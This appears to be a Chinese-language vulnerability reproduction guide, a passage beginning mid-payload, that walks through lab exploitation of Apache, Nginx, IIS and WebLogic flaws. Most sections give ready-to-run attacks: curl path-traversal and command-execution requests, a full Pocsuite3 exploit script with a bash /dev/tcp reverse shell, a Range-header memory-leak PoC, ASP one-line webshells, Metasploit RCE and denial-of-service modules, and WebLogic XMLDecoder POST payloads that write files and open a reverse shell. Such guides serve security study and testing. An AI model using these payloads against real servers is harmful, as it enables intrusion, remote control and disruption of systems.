AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://192.168.127.1:8000/test.txt
```

![image-20220123183002152](image/image-20220123183002152.png)



------

### Apache_path Traversal(CVE-2021-41773/CVE-2021-42013)

#### 漏洞简述

```php
  Apache HTTP Server 存在路径遍历漏洞，该漏洞源于发现 Apache HTTP Server 2.4.50 版本中对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。
```

#### 影响版本

```php
Apache HTTP Server 2.4.49 ~  2.4.50
```

#### 环境搭建

```php
docker pull vulhub/httpd:2.4.49
sudo docker run -p 80:80 --name cve-2021-41773 -d vulhub/httpd:2.4.49
```

#### 漏洞复现

##### Curl

###### 读取文件

```php
curl http://172.17.0.3/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```

![image-20220115183319175](image/image-20220115183319175.png)

###### 执行命令

```php
curl -v --data "echo;id" 'http://172.17.0.3/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```

![image-20220115183440798](image/image-20220115183440798.png)



##### MSF

###### 漏洞验证

```php
msfconsole
use auxiliary/scanner/http/apache_normalize_path
set RHOSTS 172.17.0.3
set RPORT 80
set targeturi /icons/
set SSL false
run
```

![image-20220115183716388](image/image-20220115183716388.png)

###### 漏洞利用

```php
msfconsole
use exploit/multi/http/apache_normalize_path_rce
set rhosts 172.17.0.3
set rport 80
set SSL false
set target 1
set cmd id
run
```

![image-20220115183808415](image/image-20220115183808415.png)



#### Pocsuite3利用脚本

```python
import urllib
from collections import OrderedDict
from pocsuite3.api import POCBase,register_poc,OptString,Output,logger,requests,get_listener_port,get_listener_ip
from pocsuite3.modules.listener import REVERSE_PAYLOAD
from pocsuite3.lib.core.interpreter_option import OptDict

class exp(POCBase):
    vulID = '99364'
    version = '1.0'
    author = ['']
    vulDate = '2021-10-6'
    createDate = '2021-10-6'
    updateDate = '2021-10-9'
    references = ['https://www.seebug.org/vuldb/ssvid-99364']
    name = 'Apache HTTPd'
    appPowerLink = 'https://httpd.apache.org/'
    appName = 'Apache HTTPd'
    appVersion = '2.4.49 or 2.4.50'
    vulType = 'dir-traversal'
    desc = 'Apache HTTPd cve-2021-41773 cve-2021-42013'
    samples = ['']
    dork = {'zoomeye': '"Apache/2.4.49" "Apache/2.4.50"'}
    install_requires = []
    desc = '''Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web
        目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器'''

    def _check(self):
        self.url = self.url.rstrip("/")
        res = requests.get(self.url,timeout=10,verify=False,allow_redirects=False)
        if 'Apache/2.4.49' in str(res.headers):
            return True
        elif 'Apache/2.4.50' in str(res.headers):
            return True
        return False

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('', description="输入要执行命令", require=False)
        return o

    def _verify(self):
        result = {}
        if not self._check():
            return self.parse_output(result)
        for file in ['/etc/passwd','/windows/win.ini']:
            filepath = "/icons/" + "/.%%32%65" * 10 + file
            try:
                req = urllib.request.Request(f"{self.url+filepath}")
                res = urllib.request.urlopen(req).read()
                print(res)
                if b':/bin' in res or b'[fonts]' in res:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo'][filepath] = res.decode()
            except Exception as e:
                print(e)
        return self.parse_output(result)

    def _attack(self):
        result = {}
        if not self._check():
            return self.parse_output(result)
        payload = ["/cgi-bin" + '/.%%32%65' * 10 + "/bin/bash",
                   "/cgi-bin" + '/.%%32%65' * 10 + "C:\\windows\\system\\cmd.exe"]
        for i in payload:
            try:
                command = self.get_option("command")
                if not command:
                    command = "whoami"
                data = 'echo Content-Type: text/plain; echo;{}'.format(command)
                data = data.encode('ascii')
                res = urllib.request.Request(self.url + i, data=data)
                res = urllib.request.urlopen(res).read().decode('utf-8')
                if len(res) != 0:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo'][command] = res
            except Exception as e:
                pass
        return self.parse_output(result)

    def _shell(self):
        result = {}
        if not  self._check():
            return self.parse_output()
        payload = ["/cgi-bin" + '/.%%32%65' * 10 + "/bin/bash",
                   "/cgi-bin" + '/.%%32%65' * 10 + "C:\\windows\\system\\cmd.exe"]
        reverse_shell = f"bash -i >& /dev/tcp/{get_listener_ip()}/{get_listener_port()} 0>&1"
        for i in payload:
            data = 'echo Content-Type: text/plain; echo;{reverse_shell}'.format(reverse_shell=reverse_shell)
            data = data.encode('ascii')
            try:
                res = urllib.request.Request(self.url + i, data=data)
                res = urllib.request.urlopen(res).read().decode('utf-8')
            except Exception as e:
                logger.warn(str(e))
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(exp)
```

#### 漏洞修复

1、若低于 2.4.49版本，可不升级。
2、若Apache HTTPd为 2.4.49版本与Apache HTTPd 2.4.50 ，请尽快升级至最新版本。





## Nginx漏洞复现

### Nginx 文件名逻辑漏洞（CVE-2013-4547）

#### 漏洞简述

```php
2013年底，nginx再次爆出漏洞（CVE-2013-4547），此漏洞可导致目录跨越及代码执行，
```

#### 漏洞原理

这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。

举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：

```
location ~ \.php$ {
    include        fastcgi_params;

    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
    fastcgi_param  DOCUMENT_ROOT /var/www/html;
}
```

正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。

而存在CVE-2013-4547的情况下，我们请求`1.gif[0x20][0x00].php`，这个URI可以匹配上正则`\.php$`，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是`1.gif[0x20]`，就设置其为`SCRIPT_FILENAME`的值发送给fastcgi。

fastcgi根据`SCRIPT_FILENAME`的值进行解析，最后造成了解析漏洞。

所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。

再举个例子，比如很多网站限制了允许访问后台的IP：

```
location /admin/ {
    allow 127.0.0.1;
    deny all;
}
```

我们可以请求如下URI：`/test[0x20]/../admin/index.php`，这个URI不会匹配上location后面的`/admin/`，也就绕过了其中的IP验证；但最后请求的是`/test[0x20]/../admin/index.php`文件，也就是`/admin/index.php`，成功访问到后台。（这个前提是需要有一个目录叫“test ”：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）

#### 影响版本

```php
Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7
```

#### 环境搭建

本次环境使用vulhub来搭建

```php
cd vulhub/nginx/CVE-2013-4547
docker-compose up -d
```

#### 漏洞复现

（1）环境启动后，访问`http://your-ip:8080/`即可看到一个上传页面

![image-20220124021450203](image/image-20220124021450203.png)

（2）这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个"info.gif[空格] "，注意后面的空格：

![image-20220124021612149](image/image-20220124021612149.png)

（3）访问`http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php`，即可发现PHP已被解析：

![image-20220124021730034](image/image-20220124021730034.png)

注意，[0x20]是空格，[0x00]是`\0`，这两个字符都不需要编码。



------

### Nginx越界读取缓存漏洞（CVE-2017-7529）

#### 漏洞简述

```php
 Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。
 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。
```

#### 影响版本

```php
Nginx 0.5.6 ~ 1.13.2
```

#### 环境搭建

本次环境使用vulhub来搭建

```php
cd vulhub/nginx/CVE-2017-7529
docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:8080/`，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。

![image-20220124022134581](image/image-20220124022134581.png)

（2）调用`python3 poc.py http://your-ip:8080/`，读取返回结果：

![image-20220124022309045](image/image-20220124022309045.png)

可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。

如果读取有误，请调整poc.py中的偏移地址（605）。

POC脚本：

```python
#!/usr/bin/env python
import sys
import requests

if len(sys.argv) < 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]
file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
print(r.text)
```



------

### Nginx 解析漏洞复现

#### 漏洞简述

```php
用户配置不当造成的解析漏洞
```

#### 影响版本

```php
该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。
```

#### 环境搭建

本次环境使用vulhub来搭建

```php
cd vulhub/nginx/nginx_parsing_vulnerability
docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip/index.php`可以测试上传功能，上传代码不存在漏洞，但利用解析漏洞即可getshell

![image-20220124023827168](image/image-20220124023827168.png)

（2）不允许上传php文件

![image-20220124023902419](image/image-20220124023902419.png)



（3）制作一张shell.png图片马图片

```
cat nginx.png info.php > info.png
```

![image-20220124025056701](image/image-20220124025056701.png)

（4）将shell.jpg图片马上传到目标服务器上，然后利用解析漏洞getshell

![image-20220124024126981](image/image-20220124024126981.png)



![image-20220124025259312](image/image-20220124025259312.png)





## IIS漏洞复现

#### IIS6

##### IIS 6.0解析漏洞

###### 漏洞简介

```php
  解析漏洞是指web服务器因对HTTP请求处理不当导致将非可执行的脚本,文件等当作可执行的脚本去执行.该漏洞一般配合web容器(iis,nginx,apache,tomcat等)的文件上传功能去使用,以获取服务器的权限.
```

###### 影响版本

```php
IIS6.0
```

###### 环境搭建

```php
Windows server 2003 R2 安装IIS服务
```

![image-20220123173407881](image/image-20220123173407881.png)

开启ASP选项

![image-20220123174327140](image/image-20220123174327140.png)



###### 漏洞复现

目录解析漏洞

在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.

（1）在服务器上新建一个shell.asp目录，在该目录中新建一个shell.jpg文件，内容为ASP一句话木马`<%eval request("cmd")%>`

![image-20220123173559957](image/image-20220123173559957.png)

![image-20220123174416338](image/image-20220123174416338.png)

（2）在浏览器上访问shell.jpg文件，返回了空白页面，这里是已经把shell.jpg当成了asp文件执行

![image-20220123174506836](image/image-20220123174506836.png)



（3）用蚁剑连接

![image-20220123174722229](image/image-20220123174722229.png)



**文件解析/后缀解析**

简介:在IIS6.0下,分号后面的内容不被解析,举个例子,xx.asp;.jpg将会当作xx.asp去解析执行.
IIS6.0 默认的可执行文件除了.asp，还包含这三种：.asa .cdx .cer. 例如：test.asa 、 test.cdx 、 test.cer

（1）在Web目录中新建一个shell.cer文件，内容为ASP一句话木马`<%eval request("cmd")%>`

![image-20220123175244307](image/image-20220123175244307.png)

（2）用蚁剑成功连接

![image-20220123175316819](image/image-20220123175316819.png)





------

##### IIS6.0远程代码执行漏洞复现（CVE-2017-7269）

###### 漏洞简述

```php
 IIS 6.0默认不开启WebDAV,一旦开启了WebDAV,安装了IIS6.0的服务器将可能受到该漏洞的威胁。
```

###### 影响版本

```php
Windows 2003 R2开启WebDAV服务的IIS6.0
```

###### **环境搭建**

```php
Windows server 2003 R2 安装IIS服务,并且开启了WebDAV
```

![image-20220123172141169](image/image-20220123172141169.png)

###### 漏洞复现

MSF模块进行攻击

（1）下载exploit：https://github.com/Al1ex/CVE-2017-7269

将exploit复制到攻击机中Metasploit的iis模块下面：

/usr/share/metasploit-framework/modules/exploits/windows/iis，并重命名为cve_2017_7269.rb

![image-20220123120810050](image/image-20220123120810050.png)

（2）开启MSF调用该模块进行漏洞利用

```
use exploit/windows/iis/cve_2017_7269
set rhosts 192.168.127.150
set lhost 192.168.127.1
set HttpHost 192.168.127.150
exploit
```

![image-20220123133330594](image/image-20220123133330594.png)



------

#### IIS7

##### IIS 7&IIS 7.5解析漏洞

漏洞简述

```php
IIS7/7.5在Fast-CGI运行模式下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。
```

影响版本

```php
IIS 7  
IIS 7.5
```

环境搭建

```php
windows server 2008（x64）
IIS7
phpStudyIIS 2016版本
```

安装IIS 7

![image-20220123131419295](image/image-20220123131419295.png)

![image-20220123131442396](image/image-20220123131442396.png)

![image-20220123131537947](image/image-20220123131537947.png)

安装好PHPstudy并切换成IIS版的，php为5.2版本

![image-20220123131734438](image/image-20220123131734438.png)

![image-20220123131955797](image/image-20220123131955797.png)

先把php的cgi.fix_pathinfo 取消注释并把值改为 1

![image-20220123132239448](image/image-20220123132239448.png)

在更改下网站的处理程序映射

![image-20220123132329020](image/image-20220123132329020.png)

![image-20220123132519527](image/image-20220123132519527.png)

最后再重启PHPstuty即可



漏洞条件

* php.ini里的cgi.cgi_pathinfo=1
* IIS7在Fast-CGI运行模式下



漏洞复现

1、上传一张shell.jpg图片，内容为执行phpinfo代码

![image-20220123132718618](image/image-20220123132718618.png)

（2）浏览器访问shell.jpg/.php成功执行phpinfo

![image-20220123132828889](image/image-20220123132828889.png)



漏洞修复：

1. 配置php.ini里cgi.fix_pathinfo=0,并重启服务器

2. 在模块映射中勾选请求限制





##### **HTTP.SYS远程代码执行（MS15-034）**

漏洞简述

```php
远程代码执行漏洞存在于HTTP协议堆栈（HTTP.sys）中，当HTTP.sys未正确分析经特殊设计的HTTP请求时会导致此漏洞。成功利用后可在系统账户的上下文中执行任意代码，可导致IIS服务器所在机器蓝屏或读取内存中的数据。
```

影响版本

```php
Windows 7、Windows Server 2008 R2、Windows 8 和 Windows 8.1、Windows Server 2012 和 Windows Server 2012 R2
IIS 7.5、IIS 8.0、IIS 8.5
```

环境搭建

```
Windows 2008系统安装iis7.5服务器
```

漏洞复现

MSF模块验证漏洞

```php
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
set rhosts 192.168.127.147
exploit
```

返回以下结果说明漏洞存在

![image-20220123125036458](image/image-20220123125036458.png)

MSF模块漏洞攻击

```php
use auxiliary/dos/http/ms15_034_ulonglongadd
set rhosts 192.168.127.147
exploit
```

![image-20220123125338216](image/image-20220123125338216.png)

漏洞修复

**（1）临时办法**

```
	禁用IIS内核缓存
```

**（2）官方补丁**

```
	官方补丁下载：https://support.microsoft.com/zh-cn/kb/3042553
```





## Weblogic漏洞复现

```php
  Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。
  Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。
  在功能性上，Weblogic是Java EE的全能应用服务器，包括EJB 、JSP、servlet、JMS等，是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发及运行环境。
 在扩展性上，Weblogic Server凭借其出色的群集技术，拥有处理关键Web应用系统问题所需的性能、可扩展性和高可用性。Weblogic Server既实现了网页群集，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集，还是组件群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。
 默认端口:7001
```

**目前全球较为活跃的版本：**

```
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.1
Weblogic 12.2.1.2
Weblogic 12.2.1.3
```

### XMLDecoder 反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）

#### 漏洞简介

```php
WebLogic WLS组件中存在CVE-2017-10271远程代码执行漏洞，使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限。。
```

#### 影响版本

```php
Weblogic 10.3.6.0.0
Weblogic 12.1.3.0.0
Weblogic 12.2.1.1.0
Weblogic 12.2.1.2.0
```

#### 环境搭建

本次实验使用vulhub镜像来搭建

```php
cd vulhub/weblogic/CVE-2017-10271
sudo docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:7001/`即可看到一个404页面，但根据页面可以确定使用了Weblogic

![image-20220123223537655](image/image-20220123223537655-16429485382831.png)

（2）访问`http://your-ip:7001/wls-wsat/CoordinatorPortType11`，出现下面内容说明可能存在漏洞。

![image-20220123223615259](image/image-20220123223615259.png)

（3）构造POST包，利用漏洞写入文件

```html
POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 192.168.127.1:7001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

访问`http://192.168.127.1:7001/bea_wls_internal/test.jsp`

![image-20220123223943465](image/image-20220123223943465.png)

（4）反弹Shell

在本地运行nc监听8888端口

```php
nc -lvp 8888
```

构造POST包，利用漏洞反弹Shell

```php
POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 192.168.127.1:7001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.127.1/8888 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

![image-20220123224114242](image/image-20220123224114242.png)

（5）利用工具执行命令

![image-20220123224545233](image/image-20220123224545233.png)



------

### wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725）

#### 漏洞简介

```php
wls9-async等组件为WebLogic Server提供异步通讯服务，默认应用于WebLogic部分版本。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者通过发送精心构造的恶意 HTTP 请求，即可获得目标服务器的权限，在未授权的情况下远程执行命令。
```

#### 影响版本

```php
weblogic 10.x
weblogic 12.1.3
```

#### 环境搭建

```php
docker pull vulfocus/weblogic-cve_2019_2725
docker run -d -p 7001:7001 vulfocus/weblogic-cve_2019_2725
```

#### 漏洞存在

```php
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttps
/_async/AsyncResponseServiceSoap12
/_async/AsyncResponseServiceSoap12Jms
/_async/AsyncResponseServiceSoap12Https
```

#### 漏洞复现

（1）访问`http://your-ip:7001/`即可看到一个404页面，目标站点使用Weblogic 10.4.5版本搭建

![image-20220123225030803](image/image-20220123225030803.png)



（2）使用weblogicScan进行扫描，发现存在该漏洞

![image-20220123225318031](image/image-20220123225318031.png)

![image-20220123225335914](image/image-20220123225335914.png)

（3）使用POC脚本漏洞利用

执行命令

POC下载地址：https://github.com/TopScrew/CVE-2019-2725

```php
 python3 weblogic-2019-2725.py 10.3.6 http://192.168.127.1:7001  whoami 
```

![image-20220123225658544](image/image-20220123225658544.png)

上传Webshell

```php
 python3 weblogic-2019-2725.py 10.3.6 http://192.168.127.1:7001
```

![image-20220123225758921](image/image-20220123225758921.png)



------

### WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）

#### 漏洞简介

```php
  Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。
```

#### 影响版本

```php
Oracle WebLogic Server10.3.6.0
Oracle WebLogic Server12.2.1.2
Oracle WebLogic Server12.2.1.3
Oracle WebLogic Server12.1.3.0
```

#### 环境搭建

本次实验使用vulhub镜像来搭建

```php
cd vulhub/weblogic/CVE-2018-2628
sudo docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:7001/`即可看到一个404页面

![image-20220123230156179](image/image-20220123230156179.png)

（2）使用weblogicScan进行扫描，发现存在该漏洞

```php
python3 ws.py -t 192.168.127.1:7001
```

![image-20220123232332559](image/image-20220123232332559.png)

（3）下载ysoserial，并启动一个JRMP Server：

```php
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
```

其中，`[command]`即为我想执行的命令，而`[listen port]`是JRMP Server监听的端口。

下载地址：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

![image-20220123232724574](image/image-20220123232724574.png)

（4）使用exploit.py脚本，向目标Weblogic（`http://your-ip:7001`）发送数据包：

下载地址：https://www.exploit-db.com/exploits/44553

```php
python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
```

其中，`[victim ip]`和`[victim port]`是目标weblogic的IP和端口，`[path to ysoserial]`是本地ysoserial的路径，`[JRMPListener ip]`和`[JRMPListener port]`第一步中启动JRMP Server的IP地址和端口。`[JRMPClient]`是执行JRMPClient的类，可选的值是`JRMPClient`或`JRMPClient2`。

![image-20220123232946881](image/image-20220123232946881.png)

（5）exploit.py执行完成后，进入容器中查看/tmp/123是否已新建成功

![image-20220123232910390](image/image-20220123232910390.png)



------

### Weblogic 任意文件上传漏洞（CVE-2018-2894）

#### 漏洞简介

```php
  Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。
  Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在 ‘生产模式’ 下默认不开启，所以该漏洞有一定限制。两个页面分别为/ws_utc/begin.do、/ws_utc/config.do。
```

#### 影响版本

```php
weblogic 10.3.6.0
weblogic 12.1.3.0
weblogic 12.2.1.2
Weblogic 12.2.1.3。
```

#### 环境搭建

本次实验使用vulhub镜像来搭建

```php
cd vulhub/weblogic/CVE-2018-2894
sudo docker-compose up -d
```

环境启动后，访问`http://your-ip:7001/console`，即可看到后台登录页面。

执行`docker-compose logs | grep password`可查看管理员密码，管理员用户名为`weblogic`。

登录后台页面，点击`base_domain`的配置，在“高级”中开启“启用 Web 服务测试页”选项：

![image-20220123233951811](image/image-20220123233951811.png)

![image-20220123234004375](image/image-20220123234004375.png)

#### 漏洞复现

（1）访问`http://your-ip:7001/ws_utc/config.do`，设置Work Home Dir为`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`。将目录设置为`ws_utc`应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。

![image-20220123234130299](image/image-20220123234130299.png)

（2）然后点击安全 -> 增加，然后上传webshell：

![image-20220123234219563](image/image-20220123234219563.png)

（4）上传后，查看返回的数据包，其中有时间戳：

![image-20220123234317224](image/image-20220123234317224.png)

（5）然后蚁剑连接`http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]`

![image-20220123234442744](image/image-20220123234442744.png)



------

### Weblogic SSRF漏洞（CVE-2014-4210）

#### 漏洞简介

```php
 Weblogic 10.0.2.0 和 10.3.6.0版本存在SSRF漏洞
```

#### 影响版本

```php
10.0.2.0
10.3.6.0
```

#### 环境搭建

本次实验使用vulhub镜像来搭建

```php
cd vulhub/weblogic/weak_password
sudo docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:7001//uddiexplorer/SearchPublicRegistries.jsp`，若能正常访问，则可能存在此漏洞，填写任意信息，如下：

![image-20220124000103107](image/image-20220124000103107.png)

